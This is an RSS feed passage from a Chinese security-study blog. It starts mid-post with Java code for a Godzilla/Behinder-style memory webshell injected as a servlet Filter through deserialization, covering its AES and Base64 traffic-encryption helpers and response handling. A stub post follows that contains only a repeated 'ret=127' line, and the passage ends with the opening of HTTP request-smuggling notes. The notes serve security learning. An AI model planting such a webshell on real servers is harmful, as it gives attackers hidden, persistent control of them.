&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">response&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">getWriter&lt;/span>&lt;span style="color:#f92672">().&lt;/span>&lt;span style="color:#75af00">write&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">base64Encode&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">x&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">arrOut&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">toByteArray&lt;/span>&lt;span style="color:#f92672">(),&lt;/span> &lt;span style="color:#00a8c8">true&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">xc&lt;/span>&lt;span style="color:#f92672">)));&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">response&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">getWriter&lt;/span>&lt;span style="color:#f92672">().&lt;/span>&lt;span style="color:#75af00">write&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">md5&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">substring&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">16&lt;/span>&lt;span style="color:#f92672">));&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">return&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>&lt;span style="color:#00a8c8">catch&lt;/span> &lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">Exception&lt;/span> &lt;span style="color:#111">e&lt;/span>&lt;span style="color:#f92672">){&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">e&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">printStackTrace&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>涉及到的几个编码工具方法&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">static&lt;/span> &lt;span style="color:#00a8c8">byte&lt;/span>&lt;span style="color:#f92672">[]&lt;/span> &lt;span style="color:#75af00">base64Decode&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">String&lt;/span> &lt;span style="color:#111">bs&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#00a8c8">throws&lt;/span> &lt;span style="color:#111">Exception&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">byte&lt;/span>&lt;span style="color:#f92672">[]&lt;/span> &lt;span style="color:#111">value&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">null&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">Class&lt;/span> &lt;span style="color:#111">base64&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">try&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">base64&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">Class&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">forName&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;java.util.Base64&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">Object&lt;/span> &lt;span style="color:#111">decoder&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">base64&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">getMethod&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;getDecoder&amp;#34;&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">Class&lt;/span>&lt;span style="color:#f92672">[])&lt;/span>&lt;span style="color:#00a8c8">null&lt;/span>&lt;span style="color:#f92672">).&lt;/span>&lt;span style="color:#75af00">invoke&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">base64&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">Object&lt;/span>&lt;span style="color:#f92672">[])&lt;/span>&lt;span style="color:#00a8c8">null&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">value&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#00a8c8">byte&lt;/span>&lt;span style="color:#f92672">[])((&lt;/span>&lt;span style="color:#00a8c8">byte&lt;/span>&lt;span style="color:#f92672">[])&lt;/span>&lt;span style="color:#111">decoder&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">getClass&lt;/span>&lt;span style="color:#f92672">().&lt;/span>&lt;span style="color:#75af00">getMethod&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;decode&amp;#34;&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">String&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">class&lt;/span>&lt;span style="color:#f92672">).&lt;/span>&lt;span style="color:#75af00">invoke&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">decoder&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">bs&lt;/span>&lt;span style="color:#f92672">));&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span> &lt;span style="color:#00a8c8">catch&lt;/span> &lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">Exception&lt;/span> &lt;span style="color:#111">var6&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">try&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">base64&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">Class&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">forName&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;sun.misc.BASE64Decoder&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">Object&lt;/span> &lt;span style="color:#111">decoder&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">base64&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">newInstance&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">value&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#00a8c8">byte&lt;/span>&lt;span style="color:#f92672">[])((&lt;/span>&lt;span style="color:#00a8c8">byte&lt;/span>&lt;span style="color:#f92672">[])&lt;/span>&lt;span style="color:#111">decoder&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">getClass&lt;/span>&lt;span style="color:#f92672">().&lt;/span>&lt;span style="color:#75af00">getMethod&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;decodeBuffer&amp;#34;&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">String&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">class&lt;/span>&lt;span style="color:#f92672">).&lt;/span>&lt;span style="color:#75af00">invoke&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">decoder&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">bs&lt;/span>&lt;span style="color:#f92672">));&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span> &lt;span style="color:#00a8c8">catch&lt;/span> &lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">Exception&lt;/span> &lt;span style="color:#111">e&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">e&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">printStackTrace&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#111">value&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">static&lt;/span> &lt;span style="color:#111">String&lt;/span> &lt;span style="color:#75af00">base64Encode&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#00a8c8">byte&lt;/span>&lt;span style="color:#f92672">[]&lt;/span> &lt;span style="color:#111">bs&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#00a8c8">throws&lt;/span> &lt;span style="color:#111">Exception&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">String&lt;/span> &lt;span style="color:#111">value&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">null&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">Class&lt;/span> &lt;span style="color:#111">base64&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">try&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">base64&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">Class&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">forName&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;java.util.Base64&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">Object&lt;/span> &lt;span style="color:#111">Encoder&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">base64&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">getMethod&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;getEncoder&amp;#34;&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">Class&lt;/span>&lt;span style="color:#f92672">[])&lt;/span>&lt;span style="color:#00a8c8">null&lt;/span>&lt;span style="color:#f92672">).&lt;/span>&lt;span style="color:#75af00">invoke&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">base64&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">Object&lt;/span>&lt;span style="color:#f92672">[])&lt;/span>&lt;span style="color:#00a8c8">null&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">value&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">String&lt;/span>&lt;span style="color:#f92672">)&lt;/span>&lt;span style="color:#111">Encoder&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">getClass&lt;/span>&lt;span style="color:#f92672">().&lt;/span>&lt;span style="color:#75af00">getMethod&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;encodeToString&amp;#34;&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#00a8c8">byte&lt;/span>&lt;span style="color:#f92672">[].&lt;/span>&lt;span style="color:#75af00">class&lt;/span>&lt;span style="color:#f92672">).&lt;/span>&lt;span style="color:#75af00">invoke&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">Encoder&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">bs&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span> &lt;span style="color:#00a8c8">catch&lt;/span> &lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">Exception&lt;/span> &lt;span style="color:#111">var6&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">try&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">base64&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">Class&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">forName&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;sun.misc.BASE64Encoder&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">Object&lt;/span> &lt;span style="color:#111">Encoder&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">base64&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">newInstance&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">value&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">String&lt;/span>&lt;span style="color:#f92672">)&lt;/span>&lt;span style="color:#111">Encoder&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">getClass&lt;/span>&lt;span style="color:#f92672">().&lt;/span>&lt;span style="color:#75af00">getMethod&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;encode&amp;#34;&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#00a8c8">byte&lt;/span>&lt;span style="color:#f92672">[].&lt;/span>&lt;span style="color:#75af00">class&lt;/span>&lt;span style="color:#f92672">).&lt;/span>&lt;span style="color:#75af00">invoke&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">Encoder&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">bs&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span> &lt;span style="color:#00a8c8">catch&lt;/span> &lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">Exception&lt;/span> &lt;span style="color:#111">e&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">e&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">printStackTrace&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#111">value&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">static&lt;/span> &lt;span style="color:#111">String&lt;/span> &lt;span style="color:#75af00">md5&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">String&lt;/span> &lt;span style="color:#111">s&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">String&lt;/span> &lt;span style="color:#111">ret&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">null&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">try&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">MessageDigest&lt;/span> &lt;span style="color:#111">m&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">MessageDigest&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">getInstance&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;MD5&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">m&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">update&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">s&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">getBytes&lt;/span>&lt;span style="color:#f92672">(),&lt;/span> &lt;span style="color:#111">0&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">s&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">length&lt;/span>&lt;span style="color:#f92672">());&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">ret&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">BigInteger&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">1&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">m&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">digest&lt;/span>&lt;span style="color:#f92672">())).&lt;/span>&lt;span style="color:#75af00">toString&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">16&lt;/span>&lt;span style="color:#f92672">).&lt;/span>&lt;span style="color:#75af00">toUpperCase&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span> &lt;span style="color:#00a8c8">catch&lt;/span> &lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">Exception&lt;/span> &lt;span style="color:#111">e&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">e&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">printStackTrace&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#111">ret&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">byte&lt;/span>&lt;span style="color:#f92672">[]&lt;/span> &lt;span style="color:#75af00">x&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#00a8c8">byte&lt;/span>&lt;span style="color:#f92672">[]&lt;/span> &lt;span style="color:#111">s&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#00a8c8">boolean&lt;/span> &lt;span style="color:#111">m&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">String&lt;/span> &lt;span style="color:#111">xc&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">try&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">Cipher&lt;/span> &lt;span style="color:#111">c&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">Cipher&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">getInstance&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;AES&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">c&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">init&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">m&lt;/span> &lt;span style="color:#f92672">?&lt;/span> &lt;span style="color:#111">1&lt;/span> &lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#111">2&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">SecretKeySpec&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">xc&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">getBytes&lt;/span>&lt;span style="color:#f92672">(),&lt;/span> &lt;span style="color:#d88200">&amp;#34;AES&amp;#34;&lt;/span>&lt;span style="color:#f92672">));&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#111">c&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">doFinal&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">s&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span> &lt;span style="color:#00a8c8">catch&lt;/span> &lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">Exception&lt;/span> &lt;span style="color:#111">e&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#00a8c8">null&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>测试效果&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20220602221346197.png" alt="image-20220602221346197">&lt;/p>
&lt;p>成功达到预期效果&lt;/p>
&lt;h3 id="注意">注意&lt;/h3>
&lt;ol>
&lt;li>
&lt;p>我们通过反序列化接入的冰蝎和哥斯拉是作为添加的Filter的一部分，所以一旦Filter被kill了，冰蝎和哥斯拉也将会连不上&lt;/p>
&lt;/li>
&lt;li>
&lt;p>x&lt;/p>
&lt;/li>
&lt;/ol>
&lt;details>
&lt;summary>
&lt;h4 class="inline">
以下是本文中涉及到的 和我学习时看过的所有文章的链接🔗 每日感谢互联网的丰富资源（
&lt;/h4>
&lt;/summary>
&lt;p>&lt;a href="https://threedr3am.github.io/2020/06/12/%E9%83%BD0202%E5%B9%B4%E4%BA%86%E8%80%81%E5%97%A8%E8%BF%98%E5%9C%A8%E7%94%A8%E7%9A%84%20-%20%E5%90%84%E7%A7%8D%E5%A7%BF%E5%8A%BFjsp%20webshell/">都0202年了老嗨还在用的 - 各种姿势jsp webshell&lt;/a>&lt;/p>
&lt;p>&lt;a href="https://xz.aliyun.com/t/11003">JAVA内存马的“一生”&lt;/a>&lt;/p>
&lt;p>&lt;a href="https://www.anquanke.com/post/id/224698">Tomcat容器攻防笔记之JSP金蝉脱壳&lt;/a>&lt;/p>
&lt;p>&lt;a href="https://y4er.com/post/java-deserialization-inject-behinder-memshell-note/">Java反序列化注入冰蝎内存马相关踩坑笔记&lt;/a>&lt;/p>
&lt;p>&lt;a href="https://y4er.com/post/solve-the-problem-of-godzilla-memory-shell-pagecontext/">解决哥斯拉内存马pagecontext的问题&lt;/a>&lt;/p>
&lt;/details></description></item><item><title>关于常见漏洞点的思考</title><link>https://amiaaaz.github.io/2022/05/24/common-vulns-summary/</link><pubDate>Tue, 24 May 2022 17:42:07 +0800</pubDate><guid>https://amiaaaz.github.io/2022/05/24/common-vulns-summary/</guid><description>&lt;p>&lt;strong>ret=127&lt;/strong>&lt;/p>
&lt;p>&lt;strong>ret=127&lt;/strong>&lt;/p>
&lt;p>&lt;strong>ret=127&lt;/strong>&lt;/p>
&lt;p>&lt;strong>ret=127&lt;/strong>&lt;/p>
&lt;p>&lt;strong>ret=127&lt;/strong>&lt;/p>
&lt;p>&lt;strong>ret=127&lt;/strong>&lt;/p>
&lt;p>&lt;strong>ret=127&lt;/strong>&lt;/p></description></item><item><title>HTTP请求走私攻击&amp;Hop-By-Hop请求头利用学习笔记</title><link>https://amiaaaz.github.io/2022/05/21/hrs-and-hop-by-hop-request-header-abuse-study-notes/</link><pubDate>Sat, 21 May 2022 23:09:24 +0800</pubDate><guid>https://amiaaaz.github.io/2022/05/21/hrs-and-hop-by-hop-request-header-abuse-study-notes/</guid><description>&lt;p>参考链接见文末，如有错漏还请指正（滑跪&lt;/p>
&lt;p>*052822：看了很多师傅对于BigIp cve的分析后发现自己对于Hop By Hop漏洞的了解还是浅尝辄止了，不是一个好习惯，警示自己&lt;/p>
&lt;hr>
&lt;h2 id="http请求走私">HTTP请求走私&lt;/h2>
&lt;h3 id="漏洞成因">漏洞成因&lt;/h3>
